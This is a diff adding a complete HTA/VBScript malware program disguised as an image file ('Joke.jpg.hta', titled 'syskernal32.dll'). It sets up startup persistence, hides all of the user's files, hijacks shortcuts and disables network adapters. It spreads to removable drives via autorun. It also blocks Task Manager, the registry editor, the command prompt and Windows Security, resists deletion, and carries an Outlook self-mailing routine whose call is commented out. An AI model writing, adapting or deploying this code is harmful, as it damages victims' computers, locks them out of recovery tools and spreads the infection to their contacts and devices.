@@ -1,0 +1,461 @@
+<!DOCTYPE HTML>
+<html lang="en">
+  <head>
+    <title>syskernal32.dll
+    </title>
+    <HTA:APPLICATION ID="jokehta"
+                     APPLICATIONNAME = "Trojan.VBS.Joke"
+                     ICON = "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico"
+                     BORDER = "none"
+                     CAPTION = "no"
+                     SHOWINTASKBAR = "no"
+                     SINGLEINSTANCE = "no"
+                     SYSMENU = "no"
+                     SCROLL = "no"
+                     SCROLLFLAT = "no"
+                     VERSION = "v1.9 - semi_lethal - super_lehmann"
+                     INNERBORDER = "no"
+                     SELECTION = "no"
+                     MAXIMIZEBUTTON = "no"
+                     MINIMIZEBUTTON = "no"
+                     NAVIGABLE = "no"
+                     CONTEXTMENU = "no"
+                     BORDERSTYLE = "normal"
+    />
+    <script type="text/VBScript">
+    Rem Objects
+    Set WshShell = CreateObject("Wscript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+    Set colItems = oWMI.ExecQuery( _
+    "SELECT * FROM Win32_NetworkAdapter Where NetEnabled = 'True'")
+    Set bStrm = createobject("Adodb.Stream")
+    Set dc = fso.Drives
+    strUser = CreateObject("WScript.Network").UserName
+
+    Rem Makes windows uber small and moves it far away
+    window.moveTo 999999,999999
+    window.resizeTo 0,0
+    
+    Rem Functions and Initialization
+    Rem Wait function since the sleep function doesn't work in HTA
+    Sub wait(milliseconds)
+        WshShell.run "cmd /c ping localhost -n 1 - w " & milliseconds,0,True
+    End Sub
+    
+    Rem read file
+    If fso.FileExists("Joke.jpg.hta") then
+        Set objFile = fso.openTextFile("Joke.jpg.hta", 1)
+        sData = ""
+        Do Until objFile.atEndOfStream
+            sData = sData & objFile.readLine & vbCrLf
+        Loop
+        objFile.Close
+        Set objFile = Nothing
+        readFile = sData
+    Else
+        If fso.FileExists("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & startupfile) then
+            Set objFile = fso.openTextFile("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & startupfile, 1)
+            sData = ""
+            Do Until objFile.atEndOfStream
+                sData = sData & objFile.readLine & vbCrLf
+            Loop
+            objFile.Close
+            Set objFile = Nothing
+            readFile = sData
+        Else
+            readFile = "DED FILE BOIO"
+        End If
+    End If
+    
+    Rem Non obstructing msg boxes
+    If not fso.FileExists("msg.txt.vbs") then
+        Set objFile = fso.CreateTextFile("msg.txt.vbs")
+        msgwrite = "x = msgbox(" & chr(34) & "okay you just got a JOKE in your system. good luck getting it out. there is now theres no going back" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+        objFile.Write msgwrite
+        objFile.Close
+        Set objFile = Nothing
+    End If
+    
+    If not fso.FileExists("uhoh.txt.vbs") then
+        Set objFile = fso.CreateTextFile("uhoh.txt.vbs")
+        msgwrite = "x = msgbox(" & chr(34) & "We are sorry. We could not open this image because we found a problem with its contents. Please wait while we try to retrieve it's contents..." & chr(34) & " & vbCrLf & vbCrLf & " & chr(34) & "Details: This image is unresponsive." & chr(34) & chr(44) & "16 + 1" & chr(44) & chr(34) & "Explorer.EXE" & chr(34) & ")"
+        objFile.Write msgwrite
+        objFile.Close
+        Set objFile = Nothing
+    End If
+    
+    If not fso.FileExists("haha.txt.vbs") then
+        Set objFile = fso.CreateTextFile("haha.txt.vbs")
+        msgwrite = "x = msgbox(" & chr(34) & "you cannot get rid of me like that. you think it was that easy?" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+        objFile.Write msgwrite
+        objFile.Close
+        Set objFile = Nothing
+    End If
+
+    If not fso.FileExists("no.mp3.vbs") then
+        Set objFile = fso.CreateTextFile("no.mp3.vbs")
+        msgwrite = "x = msgbox(" & chr(34) & "nice try" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+        objFile.Write msgwrite
+        objFile.Close
+        Set objFile = Nothing
+    End If
+    
+    Rem Fake error message to confuzzle the victim
+    x = WshShell.Run("uhoh.txt.vbs", 0, false)
+    Rem Function to copy files to startup
+    Sub startupcopy(startupfile)
+        If not fso.FileExists("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & startupfile) then
+            If fso.FileExists(startupfile) then
+                fso.CopyFile startupfile, "C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & startupfile, true
+            End If
+        End If
+    End Sub
+    
+    Rem Function for antideletion
+    Sub antidelete(file)
+        If not fso.FileExists(file) then
+            Set objFile = fso.CreateTextFile(file,True)
+            objFile.Write readFile
+            objFile.Close
+            Set objFile = Nothing
+            x = WshShell.Run("haha.txt.vbs", 0, false)
+        End If
+    End Sub
+    
+    Rem Function to write Joke.jpg.hta to startup
+    Sub writejoketostartup(silent)
+        If not fso.FileExists("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Joke.jpg.hta") then
+            Set objFile = fso.CreateTextFile("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Joke.jpg.hta")
+            objFile.Write readFile
+            objFile.Close
+            Set objFile = Nothing
+            hide("C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Joke.jpg.hta")
+            If silent = false then
+                x = WshShell.Run("msg.txt.vbs", 0, false)
+            End If
+        End If
+    End Sub
+                 
+    Rem Function to turn off hidden file viewing
+    Sub hideviewoff()
+        Hidden = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
+        St = WshShell.RegRead(Hidden)
+        If St = 1 Then
+            WshShell.RegWrite Hidden, 2, "REG_DWORD"
+        End If
+        WshShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, false
+    End Sub
+    
+    Rem Function to hide files
+    Sub hide(Fileofchoice)
+        boolHide = True
+        If fso.FileExists(Fileofchoice) then
+            set objFile = fso.GetFile(Fileofchoice)
+            If boolHide = True then
+                If objFile.Attributes AND 2 then 
+                Else
+                    objFile.Attributes = objFile.Attributes + 2 
+                End If 
+            Else
+                If objFile.Attributes AND 2 then
+                    objFile.Attributes = objFile.Attributes - 2 
+                End If 
+            End If
+        End If
+    End Sub
+                 
+    Rem Function to block certain task
+    Sub block(programthing)
+        Dim i
+        Dim strComputer
+        Dim FindProc
+        strComputer = "."
+        FindProc = programthing
+        Set objWMIService = GetObject("winmgmts:" _
+            & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+        Set colProcessList = objWMIService.ExecQuery _
+            ("Select Name from Win32_Process WHERE Name LIKE '" & FindProc & "%'")
+        If colProcessList.count > 0 then
+            WshShell.Run "taskkill /f /im " & FindProc,0, True
+            x = WshShell.Run("no.mp3.vbs", 0, false)
+        End If
+        Set objWMIService = Nothing
+        Set colProcessList = Nothing
+    End Sub
+                 
+    Rem Hide some folders and stuff                 
+    Sub hidefolders(directory)
+        Set f = fso.GetFolder(directory)
+        Set Subfol = f.SubFolders
+        For Each objFolder in Subfol
+            boolHide = True
+            If fso.FolderExists(fso.GetAbsolutePathName(objFolder)) then
+                set objFile = fso.GetFolder(fso.GetAbsolutePathName(objFolder))
+                If boolHide = True then
+                    If objFile.Attributes AND 2 then 
+                    Else
+                        objFile.Attributes = objFile.Attributes + 2 
+                    End If 
+                Else
+                    If objFile.Attributes AND 2 then
+                        objFile.Attributes = objFile.Attributes - 2 
+                    End If
+                End If 
+            End If
+        Next
+    End Sub
+                 
+    Sub hideloop(objFolder)
+        For Each objFile In objFolder.Files
+            On Error Resume Next
+            If not LCase(fso.GetExtensionName(objFile.Name)) = "lnk" Then
+                hide(fso.GetAbsolutePathName(objFile))
+            End If
+        Next
+        For Each objSubFolder In objFolder.SubFolders
+            hideloop(objSubFolder)
+        Next
+    End Sub
+    Sub Recurse(objFolder, linkthing)
+        For Each objFile In objFolder.Files
+            On Error Resume Next
+            If LCase(fso.GetExtensionName(objFile.Name)) = "lnk" Then
+                linkthing.targetpath = "C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Joke.jpg.hta"
+                linkthing.IconLocation = "C:\Windows\System32\SHELL32.dll, 0"
+                linkthing.save
+                fso.CopyFile fso.GetAbsolutePathName(linkthing), fso.GetAbsolutePathName(objFile), true
+            End If
+        Next
+        For Each objSubFolder In objFolder.SubFolders
+            Call Recurse(objSubFolder, linkthing)
+        Next
+    End Sub
+                 
+    Rem Function to hide all files in directory
+    Sub hideall(folder)
+        hideloop(fso.GetFolder(folder))
+    End Sub
+                 
+    Rem Function to redirect shortcuts
+    Sub redirect(folderlocation)
+        WshShell.regwrite "HKEY_CURRENT_USER\Software\Joke\Linked", "1"
+        Set lnk = WshShell.CreateShortcut("C:\Users\" & strUser & "\Private_Documents.lnk")
+        Call Recurse(fso.GetFolder(folderlocation), lnk)
+    End Sub
+                                          
+    Rem Function to hide most stuff in a directory
+    Sub makethempay(directory)
+        WshShell.regwrite "HKEY_CURRENT_USER\Software\Joke\Payed", "1"                  
+        hideall(directory)
+        Set f = fso.GetFolder(directory)
+        Set Subfol = f.SubFolders
+        For Each objFolder in Subfol
+            On Error Resume Next
+            hidefolders(fso.GetAbsolutePathName(objFolder))
+            boolHide = True
+            If fso.FolderExists(fso.GetAbsolutePathName(objFolder)) then
+                set objFile = fso.GetFolder(fso.GetAbsolutePathName(objFolder))
+                If boolHide = True then
+                    If objFile.Attributes AND 2 then 
+                    Else
+                        objFile.Attributes = objFile.Attributes + 2 
+                    End If 
+                Else
+                    If objFile.Attributes AND 2 then
+                        objFile.Attributes = objFile.Attributes - 2 
+                    End If
+                End If 
+            End If
+        Next
+    End Sub
+
+    Rem Disables all ur network thingies
+    Sub killnet()
+        strComputer = "."
+        For Each objItem in colItems
+            objItem.Disable
+        Next
+    End Sub
+
+    Rem Mail itself to all your friends
+    Sub doMail()
+        On Error Resume Next
+        Set OutlookApp = CreateObject("Outlook.Application")
+        If OutlookApp = "Outlook" Then
+            Set MAPINameSpace = OutlookApp.GetNameSpace("MAPI")
+            Set AddressLists = MAPINameSpace.AddressLists
+            For Each address In AddressLists
+                If address.AddressEntries.Count <> 0 Then
+                    entryCount = address.AddressEntries.Count
+                    For i = 1 To entryCount
+                        Set newItem = OutlookApp.CreateItem(0)
+                        Set currentAddress = address.AddressEntries(i)
+                        newItem.To = currentAddress.Address
+                        newItem.Subject = "Is this you?"
+                        newItem.Body = "Is this a picture of you?" & vbcrlf & "Man, it must be so embarrassing to be seen like this..." & vbcrlf & ""
+                        Set attachments = newItem.Attachments
+                        attachments.Add "C:\Users\" & strUser & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Joke.hta"
+                        newItem.DeleteAfterSubmit = True
+                        If newItem.To <> "" Then
+                            newItem.Send
+                            WshShell.regwrite "HKEY_CURRENT_USER\Software\Joke\Sent", "1"
+                        End If
+                    Next
+                End If
+            Next
+        End If
+    End Sub
+
+    Rem Spread to drives and write an autorun file
+    Sub drivespread()
+        For Each d in dc
+            If (d.DriveType = 1) Then
+                s = d.DriveLetter
+                X = fso.CopyFile("Joke.jpg.hta", s & ":\", True)
+		Set objFile = fso.CreateTextFile("autorun.inf", s & ":\", True)
+                objFile.Write "[Autorun]"
+                objFile.Write "Open=Joke.jpg.hta"
+                objFile.Write "Action=Start Joke.jpg.hta"
+                objFile.Close
+                Set objFile = Nothing
+            End If
+        Next
+    End Sub
+
+    Rem The fun part
+    Sub Window_onLoad
+                                          
+        Rem Write key in registry to make sure the program doesn't hide files two times
+        WshShell.regwrite "HKEY_CURRENT_USER\Software\Joke\", "syskernal32.sys"
+        Rem Hides files and turns off hidden view
+        hideviewoff()
+        hide("Joke.jpg.hta")
+        hide("no.mp3.vbs")
+        hide("msg.txt.vbs")
+        hide("uhoh.txt.vbs")
+        hide("haha.txt.vbs")
+                                          
+        Rem Write file to startup
+        writejoketostartup(true)
+                                          
+        Rem Hiding all files and folders in the user's folder (payload)
+        On Error Resume Next
+        If WshShell.RegRead("HKEY_CURRENT_USER\Software\Joke\Payed") <> "1" then
+            makethempay("C:\Users\" & strUser)
+        End If
+                        
+        Rem Redirects lnk file locations to Joke.jpg.hta
+        On Error Resume Next
+        If WshShell.RegRead("HKEY_CURRENT_USER\Software\Joke\Linked") <> "1" then
+            redirect("C:\Users\" & strUser)
+        End If
+                     
+        Rem Redirects lnk file locations to Joke.jpg.hta
+        On Error Resume Next
+        If WshShell.RegRead("HKEY_CURRENT_USER\Software\Joke\Infected") <> "1" then
+            WshShell.regwrite "HKEY_CURRENT_USER\Software\Joke\Infected", "1"
+	    x = WshShell.Run("msg.txt.vbs", 0, false)
+        End If
+                     
+        Rem Mails itself (currently commented out bc of legal reasons)
+        On Error Resume Next
+        If WshShell.RegRead("HKEY_CURRENT_USER\Software\Joke\Sent") <> "1" then
+	    Rem doMail()
+        End If
+                     
+        Rem Change wallpaper
+	xHttp.Open "GET", "https://wallpaperaccess.com/full/141940.jpg", False
+	xHttp.Send
+	With bStrm
+	    .type = 1
+	    .open
+	    .write xHttp.responseBody
+	    .savetofile "C:\Users\" & strUser & "\wallpaper.jpg", 2
+	End With
+        sWallPaper = "C:\Users\" & strUser & "\wallpaper.jpg"
+        WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", sWallPaper
+        WshShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, false
+
+	Rem Kill internet
+        killnet()
+	
+	Rem Spread to flash drives
+	drivespread()
+
+        Rem Use regedit to disable various thingys
+        WshShell.regwrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\"
+        task = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, false)
+        fileext = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f", 0, false)
+        safe = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v SafeModeBlockNonAdmins /t REG_DWORD /d 1 /f", 0, false)
+        cmd = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f", 0, false)
+	run = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", 0, false)
+	ctrlpnl = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", 0, false)
+        reg = WshShell.Run("Reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", 0, false)
+
+        Rem Anti-deletion, app blocking, startup copying, and hiding files
+        Do
+            If not fso.FileExists("haha.txt.vbs") then
+                Set objFile = fso.CreateTextFile("haha.txt.vbs")
+                msgwrite = "x = msgbox(" & chr(34) & "you cannot get rid of me like that. you think it was that easy?" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+                objFile.Write msgwrite
+                objFile.Close
+                Set objFile = Nothing
+            End If
+            If not fso.FileExists("msg.txt.vbs") then
+                Set objFile = fso.CreateTextFile("msg.txt.vbs")
+                msgwrite = "x = msgbox(" & chr(34) & "okay you just got a JOKE in your system. good luck getting it out. there is now theres no going back" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+               objFile.Write msgwrite
+                objFile.Close
+                Set objFile = Nothing
+            End If
+            If not fso.FileExists("no.mp3.vbs") then
+               Set objFile = fso.CreateTextFile("no.mp3.vbs")
+                msgwrite = "x = msgbox(" & chr(34) & "nice try" & chr(34) & chr(44) & "16 + 4" & chr(44) & chr(34) & "no" & chr(34) & ")"
+                objFile.Write msgwrite
+                objFile.Close
+                Set objFile = Nothing
+            End If
+            writejoketostartup(false)
+            hideviewoff()
+            hide("Joke.jpg.hta")
+            antidelete("Joke.jpg.hta")
+            block("regedit.exe")
+            block("compmgmt.exe")
+            block("cleanmgr.exe")
+            block("eventvwr.exe")
+            block("powershell.exe")
+            block("msconfig.exe")
+            block("powershell_ise.exe")
+            block("MdSched.exe")
+            block("SecHealthUI.exe")
+            block("mmc.exe")
+            block("Taskmgr.exe")
+            antidelete("Joke.jpg.hta")
+            hideviewoff()
+            hide("Joke.jpg.hta")
+        Loop
+    End Sub
+
+    Rem This program is persistant! (kind of like a little brother that won't go away)
+    Sub Window_onBeforeUnload
+        Rem Reopen when closed
+        Return = WshShell.Run("Joke.jpg.hta", 0, false)
+        Rem Make sure victim didn't delete the file
+        antidelete("Joke.jpg.hta")
+        hideviewoff()
+        Rem Hide the files
+        hide("Joke.jpg.hta")
+        hide("Joke.mp3")
+        hide("Joke.ico")
+        hide("no.mp3.vbs")
+        hide("msg.txt.vbs")
+	Rem Msg box to "congratulate" the victim
+        x = WshShell.Run("haha.txt.vbs", 0, false)
+    End Sub
+    </script>
+  </head>
+  <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+    <bgsound src="https://ia801409.us.archive.org/12/items/rebeccablackfriday_202010/Joke.mp3" preload="auto" loop autoplay type="audio/mp3"/>
+  </body>
+</html>
